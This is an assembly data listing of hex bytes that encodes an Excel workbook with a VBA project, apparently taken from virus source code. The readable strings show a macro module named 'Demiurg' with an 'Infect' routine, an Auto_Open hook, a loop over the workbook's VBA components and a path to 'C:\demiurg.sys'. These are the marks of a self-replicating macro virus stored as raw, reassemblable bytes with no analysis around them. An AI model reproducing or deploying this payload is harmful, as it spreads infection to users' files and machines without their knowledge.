	db 000h, 02Bh, 000h, 002h, 000h, 000h, 000h, 082h
	db 000h, 002h, 000h, 001h, 000h, 080h, 000h, 008h
	db 0E6h, 009h, 000h, 025h, 002h, 004h, 000h, 000h
	db 000h, 0FFh, 000h, 081h, 000h, 002h, 000h, 0C1h
	db 004h, 014h, 000h, 000h, 000h, 015h, 000h, 000h
	db 000h, 083h, 000h, 002h, 000h, 000h, 000h, 084h
	db 000h, 002h, 000h, 000h, 000h, 0A1h, 000h, 022h
	db 000h, 000h, 000h, 0FFh, 000h, 001h, 000h, 001h
	db 000h, 001h, 000h, 004h, 000h, 0DEh, 0C7h, 062h
	db 000h, 08Ah, 01Dh, 03Ch, 0FCh, 0FDh, 07Eh, 0DFh
	db 03Fh, 08Ah, 01Dh, 03Ch, 0FCh, 0FDh, 07Eh, 0DFh
	db 03Fh, 0CEh, 05Ah, 055h, 000h, 002h, 000h, 00Ah
	db 000h, 000h, 002h, 00Eh, 0E6h, 00Fh, 000h, 03Eh
	db 002h, 012h, 000h, 0B6h, 006h, 0E6h, 004h, 000h
	db 040h, 0E6h, 00Bh, 000h, 01Dh, 000h, 00Fh, 000h
	db 003h, 0E6h, 006h, 000h, 001h, 0E6h, 007h, 000h
	db 0BAh, 001h, 00Bh, 000h, 008h, 000h, 000h, 054h
	db 061h, 062h, 065h, 06Ch, 06Ch, 065h, 031h, 00Ah
	db 0E6h, 031h, 000h, 001h, 016h, 001h, 000h, 000h
	db 0B6h, 000h, 0FFh, 0FFh, 001h, 001h, 0E6h, 004h
	db 000h, 0E6h, 004h, 0FFh, 0E6h, 004h, 000h, 0E6h
	db 006h, 0FFh, 0E6h, 034h, 000h, 010h, 000h, 000h
	db 000h, 003h, 000h, 000h, 000h, 005h, 000h, 000h
	db 000h, 007h, 000h, 000h, 000h, 0E6h, 008h, 0FFh
	db 001h, 001h, 008h, 000h, 000h, 000h, 0E6h, 004h
	db 0FFh, 078h, 000h, 000h, 000h, 0DEh, 000h, 000h
	db 000h, 0AFh, 002h, 000h, 000h, 0F5h, 001h, 000h
	db 000h, 0E6h, 004h, 0FFh, 0E6h, 004h, 000h, 001h
	db 000h, 000h, 000h, 0B5h, 031h, 0B7h, 031h, 000h
	db 000h, 0FFh, 0FFh, 023h, 000h, 000h, 000h, 088h
	db 000h, 000h, 000h, 008h, 0E6h, 020h, 000h, 0FFh
	db 0FFh, 000h, 000h, 0CBh, 002h, 000h, 000h, 0D6h
	db 000h, 000h, 000h, 0D6h, 000h, 000h, 000h, 01Fh
	db 003h, 0E6h, 004h, 000h, 0E6h, 004h, 0FFh, 0E6h
	db 004h, 000h, 0DFh, 000h, 0FFh, 0FFh, 0E6h, 004h
	db 000h, 00Ch, 000h, 0E6h, 058h, 0FFh, 044h, 000h
	db 069h, 000h, 065h, 000h, 073h, 000h, 065h, 000h
	db 041h, 000h, 072h, 000h, 062h, 000h, 065h, 000h
	db 069h, 000h, 074h, 000h, 073h, 000h, 06Dh, 000h
	db 061h, 000h, 070h, 000h, 070h, 000h, 065h, 0E6h
	db 01Fh, 000h, 024h, 000h, 002h, 001h, 007h, 000h
	db 000h, 000h, 0E6h, 008h, 0FFh, 0E6h, 024h, 000h
	db 02Bh, 000h, 000h, 000h, 0CAh, 003h, 0E6h, 006h
	db 000h, 054h, 000h, 061h, 000h, 062h, 000h, 065h
	db 000h, 06Ch, 000h, 06Ch, 000h, 065h, 000h, 031h
	db 0E6h, 031h, 000h, 012h, 000h, 002h, 001h, 006h
	db 000h, 000h, 000h, 004h, 000h, 000h, 000h, 0E6h
	db 004h, 0FFh, 0E6h, 024h, 000h, 03Bh, 000h, 000h
	db 000h, 0BFh, 003h, 0E6h, 006h, 000h, 044h, 000h
	db 065h, 000h, 06Dh, 000h, 069h, 000h, 075h, 000h
	db 072h, 000h, 067h, 0E6h, 033h, 000h, 010h, 000h
	db 002h, 001h, 008h, 000h, 000h, 000h, 0E6h, 008h
	db 0FFh, 0E6h, 024h, 000h, 04Ah, 000h, 000h, 000h
	db 01Fh, 007h, 0E6h, 006h, 000h, 05Fh, 000h, 056h
	db 000h, 042h, 000h, 041h, 000h, 05Fh, 000h, 050h
	db 000h, 052h, 000h, 04Fh, 000h, 04Ah, 000h, 045h
	db 000h, 043h, 000h, 054h, 0E6h, 029h, 000h, 01Ah
	db 000h, 002h, 000h, 0E6h, 00Ch, 0FFh, 0E6h, 024h
	db 000h, 067h, 000h, 000h, 000h, 059h, 00Ch, 0E6h
	db 006h, 000h, 0E6h, 028h, 0FFh, 028h, 000h, 000h
	db 000h, 002h, 000h, 053h, 04Ch, 0E6h, 004h, 0FFh
	db 000h, 000h, 001h, 000h, 053h, 010h, 0E6h, 004h
	db 0FFh, 000h, 000h, 001h, 000h, 053h, 094h, 0E6h
	db 004h, 0FFh, 0E6h, 004h, 000h, 002h, 03Ch, 0E6h
	db 004h, 0FFh, 000h, 000h, 0FFh, 0FFh, 001h, 001h
	db 0E6h, 004h, 000h, 001h, 000h, 04Eh, 000h, 030h
	db 000h, 07Bh, 000h, 030h, 000h, 030h, 000h, 030h
	db 000h, 032h, 000h, 030h, 000h, 038h, 000h, 031h
	db 000h, 039h, 000h, 02Dh, 000h, 030h, 000h, 030h
	db 000h, 030h, 000h, 030h, 000h, 02Dh, 000h, 030h
	db 000h, 030h, 000h, 030h, 000h, 030h, 000h, 02Dh
	db 000h, 043h, 000h, 030h, 000h, 030h, 000h, 030h
	db 000h, 02Dh, 000h, 030h, 000h, 030h, 000h, 030h
	db 000h, 030h, 000h, 030h, 000h, 030h, 000h, 030h
	db 000h, 030h, 000h, 030h, 000h, 030h, 000h, 034h
	db 000h, 036h, 000h, 07Dh, 0E6h, 007h, 000h, 0DFh
	db 0E6h, 004h, 000h, 0E6h, 004h, 0FFh, 001h, 001h
	db 038h, 000h, 000h, 000h, 002h, 081h, 0FEh, 0E6h
	db 009h, 0FFh, 028h, 0E6h, 005h, 000h, 0FFh, 0FFh
	db 0E6h, 008h, 000h, 0E6h, 008h, 0FFh, 074h, 000h
	db 020h, 000h, 01Dh, 000h, 000h, 000h, 024h, 000h
	db 000h, 000h, 0E6h, 004h, 0FFh, 048h, 0E6h, 005h
	db 000h, 0FFh, 0FFh, 000h, 000h, 001h, 0E6h, 007h
	db 000h, 0E6h, 00Ch, 0FFh, 0E6h, 004h, 000h, 0E6h
	db 010h, 0FFh, 0E6h, 004h, 000h, 0E6h, 010h, 0FFh
	db 0E6h, 008h, 000h, 0E6h, 008h, 0FFh, 0E6h, 004h
	db 000h, 0E6h, 01Eh, 0FFh, 04Dh, 045h, 000h, 000h
	db 0E6h, 006h, 0FFh, 0E6h, 004h, 000h, 0FFh, 0FFh
	db 0E6h, 004h, 000h, 0FFh, 0FFh, 001h, 001h, 0E6h
	db 040h, 000h, 0FEh, 0CAh, 001h, 000h, 000h, 000h
	db 0E6h, 004h, 0FFh, 001h, 001h, 008h, 000h, 000h
	db 000h, 0E6h, 004h, 0FFh, 078h, 000h, 000h, 000h
	db 001h, 0A7h, 0B0h, 000h, 041h, 074h, 074h, 072h
	db 069h, 062h, 075h, 074h, 000h, 065h, 020h, 056h
	db 042h, 05Fh, 04Eh, 061h, 06Dh, 000h, 065h, 020h
	db 03Dh, 020h, 022h, 044h, 069h, 065h, 000h, 073h
	db 065h, 041h, 072h, 062h, 065h, 069h, 074h, 000h
	db 073h, 06Dh, 061h, 070h, 070h, 065h, 022h, 00Dh
	db 022h, 00Ah, 00Ah, 0A0h, 042h, 061h, 073h, 002h
	db 0A0h, 030h, 07Bh, 000h, 030h, 030h, 030h, 032h
	db 030h, 038h, 031h, 039h, 0EAh, 02Dh, 000h, 010h
	db 030h, 003h, 008h, 043h, 000h, 014h, 002h, 012h
	db 001h, 024h, 020h, 030h, 030h, 034h, 036h, 07Dh
	db 00Dh, 07Ch, 043h, 072h, 040h, 065h, 061h, 074h
	db 061h, 062h, 06Ch, 001h, 086h, 046h, 010h, 061h
	db 06Ch, 073h, 065h, 00Ch, 05Eh, 050h, 072h, 065h
	db 020h, 064h, 065h, 063h, 06Ch, 061h, 000h, 006h
	db 049h, 064h, 011h, 000h, 090h, 054h, 072h, 075h
	db 00Dh, 022h, 045h, 078h, 070h, 008h, 06Fh, 073h
	db 065h, 014h, 01Ch, 054h, 065h, 06Dh, 070h, 000h
	db 06Ch, 061h, 074h, 065h, 044h, 065h, 072h, 069h
	db 006h, 076h, 002h, 024h, 011h, 065h, 043h, 075h
	db 073h, 074h, 06Fh, 018h, 06Dh, 069h, 07Ah, 004h
	db 044h, 003h, 032h, 0E6h, 036h, 000h, 001h, 016h
	db 001h, 000h, 000h, 0B6h, 000h, 0FFh, 0FFh, 001h
	db 001h, 0E6h, 004h, 000h, 0E6h, 004h, 0FFh, 0E6h
	db 004h, 000h, 0E6h, 006h, 0FFh, 0E6h, 034h, 000h
	db 010h, 000h, 000h, 000h, 003h, 000h, 000h, 000h
	db 005h, 000h, 000h, 000h, 007h, 000h, 000h, 000h
	db 0E6h, 008h, 0FFh, 001h, 001h, 008h, 000h, 000h
	db 000h, 0E6h, 004h, 0FFh, 078h, 000h, 000h, 000h
	db 0DEh, 000h, 000h, 000h, 0AFh, 002h, 000h, 000h
	db 0F5h, 001h, 000h, 000h, 0E6h, 004h, 0FFh, 0E6h
	db 004h, 000h, 001h, 000h, 000h, 000h, 0B5h, 031h
	db 0B9h, 031h, 000h, 000h, 0FFh, 0FFh, 023h, 000h
	db 000h, 000h, 088h, 000h, 000h, 000h, 008h, 0E6h
	db 020h, 000h, 0FFh, 0FFh, 000h, 000h, 0CBh, 002h
	db 000h, 000h, 0D6h, 000h, 000h, 000h, 0D6h, 000h
	db 000h, 000h, 01Fh, 003h, 0E6h, 004h, 000h, 0E6h
	db 004h, 0FFh, 0E6h, 004h, 000h, 0DFh, 000h, 0FFh
	db 0FFh, 0E6h, 004h, 000h, 00Ch, 000h, 0E6h, 080h
	db 0FFh, 028h, 000h, 000h, 000h, 002h, 000h, 053h
	db 04Ch, 0E6h, 004h, 0FFh, 000h, 000h, 001h, 000h
	db 053h, 010h, 0E6h, 004h, 0FFh, 000h, 000h, 001h
	db 000h, 053h, 094h, 0E6h, 004h, 0FFh, 0E6h, 004h
	db 000h, 002h, 03Ch, 0E6h, 004h, 0FFh, 000h, 000h
	db 0FFh, 0FFh, 001h, 001h, 0E6h, 004h, 000h, 001h
	db 000h, 04Eh, 000h, 030h, 000h, 07Bh, 000h, 030h
	db 000h, 030h, 000h, 030h, 000h, 032h, 000h, 030h
	db 000h, 038h, 000h, 032h, 000h, 030h, 000h, 02Dh
	db 000h, 030h, 000h, 030h, 000h, 030h, 000h, 030h
	db 000h, 02Dh, 000h, 030h, 000h, 030h, 000h, 030h
	db 000h, 030h, 000h, 02Dh, 000h, 043h, 000h, 030h
	db 000h, 030h, 000h, 030h, 000h, 02Dh, 000h, 030h
	db 000h, 030h, 000h, 030h, 000h, 030h, 000h, 030h
	db 000h, 030h, 000h, 030h, 000h, 030h, 000h, 030h
	db 000h, 030h, 000h, 034h, 000h, 036h, 000h, 07Dh
	db 0E6h, 007h, 000h, 0DFh, 0E6h, 004h, 000h, 0E6h
	db 004h, 0FFh, 001h, 001h, 038h, 000h, 000h, 000h
	db 002h, 081h, 0FEh, 0E6h, 009h, 0FFh, 028h, 0E6h
	db 005h, 000h, 0FFh, 0FFh, 0E6h, 008h, 000h, 0E6h
	db 008h, 0FFh, 0E6h, 004h, 000h, 01Dh, 000h, 000h
	db 000h, 024h, 000h, 000h, 000h, 0E6h, 004h, 0FFh
	db 048h, 0E6h, 005h, 000h, 0FFh, 0FFh, 000h, 000h
	db 001h, 0E6h, 007h, 000h, 0E6h, 00Ch, 0FFh, 0E6h
	db 004h, 000h, 0E6h, 010h, 0FFh, 0E6h, 004h, 000h
	db 0E6h, 010h, 0FFh, 0E6h, 008h, 000h, 0E6h, 008h
	db 0FFh, 0E6h, 004h, 000h, 0E6h, 01Eh, 0FFh, 04Dh
	db 045h, 000h, 000h, 0E6h, 006h, 0FFh, 0E6h, 004h
	db 000h, 0FFh, 0FFh, 0E6h, 004h, 000h, 0FFh, 0FFh
	db 001h, 001h, 0E6h, 040h, 000h, 0FEh, 0CAh, 001h
	db 000h, 000h, 000h, 0E6h, 004h, 0FFh, 001h, 001h
	db 008h, 000h, 000h, 000h, 0E6h, 004h, 0FFh, 078h
	db 000h, 000h, 000h, 001h, 09Ch, 0B0h, 000h, 041h
	db 074h, 074h, 072h, 069h, 062h, 075h, 074h, 000h
	db 065h, 020h, 056h, 042h, 05Fh, 04Eh, 061h, 06Dh
	db 000h, 065h, 020h, 03Dh, 020h, 022h, 054h, 061h
	db 062h, 000h, 065h, 06Ch, 06Ch, 065h, 031h, 022h
	db 00Dh, 00Ah, 011h, 00Ah, 0F8h, 042h, 061h, 073h
	db 002h, 07Ch, 030h, 07Bh, 030h, 000h, 030h, 030h
	db 032h, 030h, 038h, 032h, 030h, 02Dh, 03Bh, 000h
	db 020h, 004h, 008h, 043h, 000h, 014h, 002h, 01Ch
	db 001h, 024h, 030h, 030h, 008h, 034h, 036h, 07Dh
	db 00Dh, 07Ch, 043h, 072h, 065h, 061h, 010h, 074h
	db 061h, 062h, 06Ch, 001h, 086h, 046h, 061h, 06Ch
	db 004h, 073h, 065h, 00Ch, 0BCh, 050h, 072h, 065h
	db 064h, 065h, 048h, 063h, 06Ch, 061h, 000h, 006h
	db 049h, 064h, 000h, 087h, 054h, 004h, 072h, 075h
	db 00Dh, 022h, 045h, 078h, 070h, 06Fh, 073h, 002h
	db 065h, 014h, 01Ch, 054h, 065h, 06Dh, 070h, 06Ch
	db 061h, 080h, 074h, 065h, 044h, 065h, 072h, 069h
	db 076h, 002h, 024h, 001h, 011h, 065h, 043h, 075h
	db 073h, 074h, 06Fh, 06Dh, 069h, 006h, 07Ah, 004h
	db 088h, 003h, 032h, 000h, 001h, 016h, 001h, 000h
	db 001h, 0B6h, 000h, 0FFh, 0FFh, 001h, 001h, 0E6h
	db 004h, 000h, 0E6h, 004h, 0FFh, 0E6h, 004h, 000h
	db 0E6h, 006h, 0FFh, 0E6h, 034h, 000h, 010h, 000h
	db 000h, 000h, 003h, 000h, 000h, 000h, 005h, 000h
	db 000h, 000h, 007h, 000h, 000h, 000h, 0E6h, 008h
	db 0FFh, 001h, 001h, 008h, 000h, 000h, 000h, 0E6h
	db 004h, 0FFh, 078h, 000h, 000h, 000h, 0DEh, 000h
	db 000h, 000h, 037h, 003h, 000h, 000h, 0A5h, 001h
	db 000h, 000h, 0E6h, 004h, 0FFh, 002h, 000h, 000h
	db 000h, 001h, 000h, 000h, 000h, 0B5h, 031h, 0BBh
	db 031h, 000h, 000h, 0FFh, 0FFh, 003h, 0E6h, 007h
	db 000h, 002h, 0E6h, 020h, 000h, 0FFh, 0FFh, 000h
	db 000h, 053h, 003h, 000h, 000h, 0D6h, 000h, 000h
	db 000h, 0D6h, 000h, 000h, 000h, 0B7h, 005h, 0E6h
	db 004h, 000h, 0E6h, 004h, 0FFh, 0E6h, 004h, 000h
	db 0DFh, 000h, 0FFh, 0FFh, 0E6h, 006h, 000h, 0E6h
	db 080h, 0FFh, 028h, 0E6h, 005h, 000h, 002h, 03Ch
	db 00Ch, 000h, 0FFh, 0FFh, 0E6h, 004h, 000h, 002h
	db 03Ch, 0E6h, 004h, 0FFh, 0E6h, 004h, 000h, 002h
	db 03Ch, 004h, 000h, 0FFh, 0FFh, 0E6h, 004h, 000h
	db 002h, 03Ch, 008h, 000h, 0FFh, 0FFh, 000h, 000h
	db 0FFh, 0FFh, 001h, 001h, 0E6h, 006h, 000h, 0E8h
	db 005h, 0C0h, 038h, 003h, 000h, 0DFh, 0E6h, 004h
	db 000h, 050h, 000h, 000h, 000h, 001h, 001h, 010h
	db 001h, 000h, 000h, 00Bh, 012h, 01Eh, 002h, 080h
	db 0E6h, 006h, 000h, 060h, 0E6h, 004h, 000h, 0E6h
	db 008h, 0FFh, 0E6h, 004h, 000h, 0E6h, 004h, 0FFh
	db 0E6h, 004h, 000h, 0E6h, 00Ah, 0FFh, 000h, 000h
	db 003h, 000h, 003h, 000h, 000h, 000h, 084h, 000h
	db 000h, 001h, 0E6h, 006h, 000h, 080h, 000h, 000h
	db 000h, 0E6h, 004h, 0FFh, 0E6h, 004h, 000h, 0E6h
	db 004h, 0FFh, 0C0h, 000h, 000h, 000h, 028h, 0E6h
	db 007h, 000h, 0E6h, 004h, 0FFh, 068h, 0FFh, 040h
	db 000h, 0E6h, 00Ah, 0FFh, 001h, 000h, 003h, 000h
	db 003h, 000h, 003h, 000h, 084h, 000h, 000h, 001h
	db 0E6h, 006h, 000h, 00Bh, 012h, 02Ah, 002h, 0E6h
	db 004h, 0FFh, 002h, 000h, 000h, 060h, 0E6h, 004h
	db 000h, 0E6h, 008h, 0FFh, 0E6h, 004h, 000h, 0E6h
	db 004h, 0FFh, 0E6h, 004h, 000h, 0E6h, 00Ah, 0FFh
	db 002h, 000h, 00Dh, 000h, 00Dh, 000h, 006h, 000h
	db 084h, 000h, 000h, 001h, 000h, 000h, 004h, 000h
	db 0E6h, 006h, 0FFh, 010h, 000h, 000h, 000h, 040h
	db 0E6h, 007h, 000h, 080h, 000h, 000h, 000h, 0E6h
	db 004h, 0FFh, 002h, 083h, 01Ch, 002h, 0E6h, 004h
	db 0FFh, 008h, 000h, 0FFh, 0FFh, 000h, 001h, 0E6h
	db 004h, 000h, 0E6h, 006h, 0FFh, 0E6h, 004h, 000h
	db 0E6h, 008h, 0FFh, 0E6h, 004h, 000h, 01Dh, 000h
	db 000h, 000h, 024h, 000h, 000h, 000h, 0E6h, 004h
	db 0FFh, 0F0h, 000h, 000h, 000h, 002h, 000h, 002h
	db 0E6h, 00Fh, 000h, 0E6h, 010h, 0FFh, 080h, 000h
	db 000h, 000h, 0E6h, 018h, 0FFh, 0D8h, 0E6h, 00Bh
	db 000h, 008h, 000h, 004h, 000h, 0E6h, 004h, 0FFh
	db 0E6h, 004h, 000h, 0E6h, 018h, 0FFh, 004h, 000h
	db 040h, 000h, 000h, 000h, 04Dh, 045h, 000h, 000h
	db 0E6h, 006h, 0FFh, 0E6h, 004h, 000h, 0FFh, 0FFh
	db 0E6h, 004h, 000h, 0FFh, 0FFh, 001h, 001h, 0E6h
	db 040h, 000h, 0FEh, 0CAh, 001h, 000h, 010h, 000h
	db 022h, 081h, 008h, 000h, 006h, 000h, 00Ch, 0E6h
	db 006h, 000h, 081h, 008h, 004h, 012h, 000h, 000h
	db 000h, 008h, 000h, 000h, 000h, 004h, 081h, 008h
	db 000h, 002h, 000h, 000h, 000h, 020h, 000h, 000h
	db 000h, 022h, 081h, 008h, 000h, 006h, 000h, 00Ch
	db 000h, 040h, 0E6h, 004h, 000h, 081h, 008h, 004h
	db 00Ah, 000h, 000h, 000h, 048h, 0E6h, 004h, 000h
	db 080h, 009h, 0E6h, 005h, 000h, 0E6h, 004h, 0FFh
	db 000h, 081h, 008h, 004h, 026h, 000h, 000h, 000h
	db 058h, 0E6h, 004h, 000h, 081h, 008h, 004h, 02Eh
	db 000h, 000h, 000h, 080h, 0E6h, 004h, 000h, 080h
	db 009h, 0E6h, 005h, 000h, 0E6h, 004h, 0FFh, 000h
	db 081h, 008h, 008h, 01Eh, 000h, 000h, 000h, 0B0h
	db 0E6h, 004h, 000h, 081h, 008h, 00Ch, 02Ch, 000h
	db 000h, 000h, 0D0h, 0E6h, 004h, 000h, 081h, 008h
	db 008h, 00Ah, 0E6h, 004h, 000h, 001h, 000h, 000h
	db 000h, 080h, 009h, 0E6h, 005h, 000h, 0E6h, 004h
	db 0FFh, 000h, 081h, 008h, 004h, 026h, 000h, 000h
	db 000h, 010h, 001h, 000h, 000h, 000h, 081h, 008h
	db 004h, 00Ah, 000h, 000h, 000h, 038h, 001h, 000h
	db 000h, 004h, 081h, 008h, 000h, 002h, 000h, 000h
	db 000h, 048h, 001h, 000h, 000h, 0E6h, 004h, 0FFh
	db 001h, 001h, 058h, 001h, 000h, 000h, 08Fh, 004h
	db 0E6h, 006h, 000h, 0AEh, 000h, 006h, 000h, 049h
	db 06Eh, 066h, 065h, 063h, 074h, 020h, 000h, 020h
	db 002h, 028h, 000h, 022h, 002h, 0E6h, 006h, 0FFh
	db 06Ch, 000h, 0FFh, 0FFh, 058h, 000h, 000h, 000h
	db 0AFh, 000h, 020h, 000h, 026h, 002h, 028h, 000h
	db 028h, 002h, 0FFh, 0FFh, 015h, 002h, 000h, 000h
	db 06Ch, 000h, 0FFh, 0FFh, 038h, 000h, 000h, 000h
	db 08Fh, 004h, 080h, 0E6h, 005h, 000h, 0AFh, 000h
	db 020h, 000h, 020h, 002h, 028h, 000h, 02Ch, 002h
	db 0E6h, 006h, 0FFh, 020h, 000h, 032h, 002h, 021h
	db 000h, 008h, 001h, 020h, 000h, 032h, 002h, 021h
	db 000h, 008h, 001h, 01Bh, 000h, 0A4h, 000h, 001h
	db 000h, 024h, 020h, 0FCh, 000h, 003h, 000h, 024h
	db 000h, 030h, 002h, 001h, 000h, 027h, 000h, 02Eh
	db 002h, 000h, 000h, 0AEh, 000h, 001h, 000h, 031h
	db 000h, 024h, 000h, 030h, 002h, 001h, 000h, 020h
	db 000h, 02Eh, 002h, 007h, 000h, 020h, 000h, 02Eh
	db 002h, 0AEh, 000h, 001h, 000h, 039h, 000h, 024h
	db 000h, 030h, 002h, 001h, 000h, 007h, 000h, 004h
	db 000h, 094h, 000h, 046h, 000h, 075h, 000h, 067h
	db 000h, 000h, 0F0h, 0F7h, 000h, 020h, 000h, 034h
	db 002h, 0F6h, 000h, 0A4h, 000h, 001h, 000h, 020h
	db 000h, 032h, 002h, 021h, 000h, 036h, 002h, 021h
	db 000h, 038h, 002h, 021h, 000h, 03Ah, 002h, 08Bh
	db 000h, 000h, 000h, 020h, 000h, 034h, 002h, 020h
	db 000h, 032h, 002h, 021h, 000h, 036h, 002h, 025h
	db 000h, 038h, 002h, 001h, 000h, 021h, 000h, 008h
	db 001h, 0AEh, 000h, 007h, 000h, 044h, 065h, 06Dh
	db 069h, 075h, 072h, 067h, 000h, 005h, 000h, 094h
	db 000h, 046h, 000h, 075h, 000h, 067h, 000h, 0F8h
	db 000h, 000h, 000h, 0F7h, 000h, 020h, 000h, 034h
	db 002h, 0F6h, 000h, 0C0h, 000h, 000h, 0A0h, 048h
	db 037h, 044h, 000h, 0AEh, 000h, 00Eh, 000h, 043h
	db 03Ah, 05Ch, 064h, 065h, 06Dh, 069h, 075h, 072h
	db 067h, 02Eh, 073h, 079h, 073h, 01Dh, 000h, 020h
	db 000h, 032h, 002h, 021h, 000h, 036h, 002h, 021h
	db 000h, 038h, 002h, 042h, 040h, 03Ch, 002h, 001h
	db 000h, 000h, 000h, 020h, 000h, 032h, 002h, 042h
	db 040h, 03Eh, 002h, 0E6h, 004h, 000h, 021h, 000h
	db 000h, 0A0h, 06Ch, 000h, 0FFh, 0FFh, 0A8h, 000h
	db 000h, 000h, 0E6h, 004h, 0FFh, 0A8h, 000h, 000h
	db 000h, 001h, 064h, 0B1h, 000h, 041h, 074h, 074h
	db 072h, 069h, 062h, 075h, 074h, 000h, 065h, 020h
	db 056h, 042h, 05Fh, 04Eh, 061h, 06Dh, 000h, 065h
	db 020h, 03Dh, 020h, 022h, 044h, 065h, 06Dh, 000h
	db 069h, 075h, 072h, 067h, 022h, 00Dh, 00Ah, 053h
	db 000h, 075h, 062h, 020h, 041h, 075h, 074h, 06Fh
	db 05Fh, 000h, 04Fh, 070h, 065h, 06Eh, 028h, 029h
	db 00Dh, 00Ah, 002h, 020h, 000h, 000h, 041h, 070h
	db 070h, 06Ch, 069h, 063h, 000h, 061h, 074h, 069h
	db 06Fh, 06Eh, 02Eh, 04Fh, 06Eh, 000h, 053h, 068h
	db 065h, 065h, 074h, 041h, 063h, 074h, 018h, 069h
	db 076h, 061h, 000h, 08Ah, 000h, 07Ah, 049h, 06Eh
	db 066h, 008h, 065h, 063h, 074h, 000h, 078h, 045h
	db 06Eh, 064h, 020h, 00Fh, 000h, 080h, 003h, 08Ah
	db 003h, 02Ah, 011h, 084h, 044h, 069h, 073h, 070h
	db 000h, 06Ch, 061h, 079h, 041h, 06Ch, 065h, 072h
	db 074h, 002h, 073h, 000h, 07Eh, 046h, 061h, 06Ch
	db 073h, 065h, 00Dh, 002h, 00Ah, 003h, 06Bh, 06Ch
	db 061h, 073h, 074h, 063h, 068h, 004h, 061h, 072h
	db 000h, 017h, 041h, 073h, 063h, 028h, 04Dh, 010h
	db 069h, 064h, 024h, 028h, 002h, 06Ch, 065h, 057h
	db 06Fh, 080h, 072h, 06Bh, 062h, 06Fh, 06Fh, 06Bh
	db 02Eh, 001h, 0B5h, 018h, 02Ch, 020h, 04Ch, 000h
	db 09Fh, 010h, 018h, 029h, 02Ch, 020h, 044h, 031h
	db 029h, 004h, 0B7h, 049h, 066h, 020h, 001h, 043h
	db 022h, 080h, 031h, 022h, 029h, 020h, 03Ch, 03Dh
	db 020h, 006h, 05Ah, 05Eh, 041h, 080h, 053h, 006h
	db 006h, 000h, 00Ch, 002h, 012h, 039h, 000h, 012h
	db 054h, 000h, 068h, 065h, 06Eh, 020h, 045h, 078h
	db 069h, 074h, 007h, 003h, 063h, 083h, 048h, 081h
	db 080h, 046h, 06Fh, 072h, 020h, 069h, 041h, 000h
	db 049h, 031h, 020h, 054h, 06Fh, 020h, 08Ch, 03Ah
	db 056h, 020h, 042h, 050h, 072h, 06Fh, 06Ah, 080h
	db 080h, 02Eh, 056h, 000h, 042h, 043h, 06Fh, 06Dh
	db 070h, 06Fh, 06Eh, 065h, 000h, 06Eh, 074h, 073h
	db 02Eh, 063h, 06Fh, 075h, 06Eh, 07Eh, 074h, 087h
	db 020h, 081h, 022h, 081h, 047h, 081h, 09Bh, 007h
	db 065h, 093h, 01Dh, 028h, 0DCh, 069h, 029h, 002h
	db 072h, 000h, 038h, 006h, 0CDh, 020h, 08Ch, 04Dh
	db 081h, 027h, 081h, 081h, 001h, 04Eh, 065h, 078h
	db 074h, 020h, 069h, 085h, 09Eh, 005h, 023h, 04Dh
	db 049h, 000h, 029h, 072h, 074h, 020h, 028h, 022h
	db 010h, 043h, 03Ah, 05Ch, 064h, 083h, 07Eh, 02Eh
	db 073h, 079h, 08Ch, 073h, 022h, 085h, 07Bh, 0CBh
	db 028h, 053h, 061h, 076h, 040h, 067h, 001h, 0C6h
	db 076h, 0E6h, 021h, 000h, 0CCh, 061h, 05Eh, 000h
	db 000h, 001h, 000h, 0FFh, 007h, 00Ch, 000h, 000h
	db 009h, 004h, 000h, 000h, 0E4h, 004h, 001h, 0E6h
	db 009h, 000h, 001h, 000h, 005h, 000h, 002h, 000h
	db 01Ah, 001h, 02Ah, 000h, 05Ch, 000h, 047h, 000h
	db 07Bh, 000h, 030h, 000h, 030h, 000h, 030h, 000h
	db 032h, 000h, 030h, 000h, 034h, 000h, 045h, 000h
	db 046h, 000h, 02Dh, 000h, 030h, 000h, 030h, 000h
	db 030h, 000h, 030h, 000h, 02Dh, 000h, 030h, 000h
	db 030h, 000h, 030h, 000h, 030h, 000h, 02Dh, 000h
	db 043h, 000h, 030h, 000h, 030h, 000h, 030h, 000h
	db 02Dh, 000h, 030h, 000h, 030h, 000h, 030h, 000h
	db 030h, 000h, 030h, 000h, 030h, 000h, 030h, 000h
	db 030h, 000h, 030h, 000h, 030h, 000h, 034h, 000h
	db 036h, 000h, 07Dh, 000h, 023h, 000h, 033h, 000h
	db 02Eh, 000h, 030h, 000h, 023h, 000h, 039h, 000h
	db 023h, 000h, 043h, 000h, 03Ah, 000h, 05Ch, 000h
	db 050h, 000h, 052h, 000h, 04Fh, 000h, 047h, 000h
	db 052h, 000h, 041h, 000h, 04Dh, 000h, 04Dh, 000h
	db 045h, 000h, 05Ch, 000h, 047h, 000h, 045h, 000h
	db 04Dh, 000h, 045h, 000h, 049h, 000h, 04Eh, 000h
	db 053h, 000h, 041h, 000h, 04Dh, 000h, 045h, 000h
	db 020h, 000h, 044h, 000h, 041h, 000h, 054h, 000h
	db 045h, 000h, 049h, 000h, 045h, 000h, 04Eh, 000h
	db 05Ch, 000h, 04Dh, 000h, 049h, 000h, 043h, 000h
	db 052h, 000h, 04Fh, 000h, 053h, 000h, 04Fh, 000h
	db 046h, 000h, 054h, 000h, 020h, 000h, 053h, 000h
	db 048h, 000h, 041h, 000h, 052h, 000h, 045h, 000h
	db 044h, 000h, 05Ch, 000h, 056h, 000h, 042h, 000h
	db 041h, 000h, 05Ch, 000h, 056h, 000h, 042h, 000h
	db 041h, 000h, 033h, 000h, 033h, 000h, 032h, 000h
	db 02Eh, 000h, 044h, 000h, 04Ch, 000h, 04Ch, 000h
	db 023h, 000h, 056h, 000h, 069h, 000h, 073h, 000h
	db 075h, 000h, 061h, 000h, 06Ch, 000h, 020h, 000h
	db 042h, 000h, 061h, 000h, 073h, 000h, 069h, 000h
	db 063h, 000h, 020h, 000h, 046h, 000h, 06Fh, 000h
	db 072h, 000h, 020h, 000h, 041h, 000h, 070h, 000h
	db 070h, 000h, 06Ch, 000h, 069h, 000h, 063h, 000h
	db 061h, 000h, 074h, 000h, 069h, 000h, 06Fh, 000h
	db 06Eh, 000h, 073h, 0E6h, 00Dh, 000h, 004h, 001h
	db 02Ah, 000h, 05Ch, 000h, 047h, 000h, 07Bh, 000h
	db 030h, 000h, 030h, 000h, 030h, 000h, 032h, 000h
	db 030h, 000h, 038h, 000h, 031h, 000h, 033h, 000h
	db 02Dh, 000h, 030h, 000h, 030h, 000h, 030h, 000h
	db 030h, 000h, 02Dh, 000h, 030h, 000h, 030h, 000h
	db 030h, 000h, 030h, 000h, 02Dh, 000h, 043h, 000h
